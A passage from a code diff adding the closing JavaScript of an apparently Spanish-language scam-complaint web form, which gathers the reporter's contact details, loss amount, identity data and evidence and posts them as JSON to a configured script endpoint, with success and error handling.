+                        nombre: document.getElementById('nombre').value,
+                        pais: document.getElementById('pais').value,
+                        whatsapp: countryCode + " " + document.getElementById('whatsapp').value,
+                        correo: document.getElementById('correo').value,
+                        tipoEstafa: document.getElementById('tipo_estafa').value,
+                        monto: document.getElementById('monto').value,
+                        descripcion: document.getElementById('descripcion').value,
+                        destinoDinero: document.getElementById('pais_envio').value,
+                        identidad: identidadData,
+                        evidencia: evidenciaData
+                    };
+
+                    // Enviar datos
+                    const response = await fetch(scriptURL, {
+                        method: 'POST',
+                        body: JSON.stringify(payload)
+                    });
+                    
+                    const result = await response.json();
+                    
+                    if(result.result === 'success') {
+                        // Ocultar formulario y encabezado de progreso
+                        document.getElementById('step-3').classList.remove('active');
+                        document.querySelector('#reclamo .bg-white.border-b').style.display = 'none'; 
+                        
+                        // Mostrar mensaje de éxito
+                        document.getElementById('success-message').classList.remove('hidden');
+                        document.getElementById('success-message').classList.add('active'); 
+                        
+                        window.scrollTo({ top: document.getElementById('reclamo').offsetTop - 50, behavior: 'smooth' });
+                    } else {
+                        throw new Error("Error en el servidor");
+                    }
+                } catch (error) {
+                    alert("Hubo un error al enviar el formulario. Por favor intenta de nuevo.");
+                    // Restaurar el botón si hay un error
+                    submitBtn.innerHTML = originalBtnText;
+                    submitBtn.disabled = false;
+                    submitBtn.classList.remove('opacity-75', 'cursor-not-allowed');
+                }
+            }
+        }
+    </script>
+</body>
+</html>
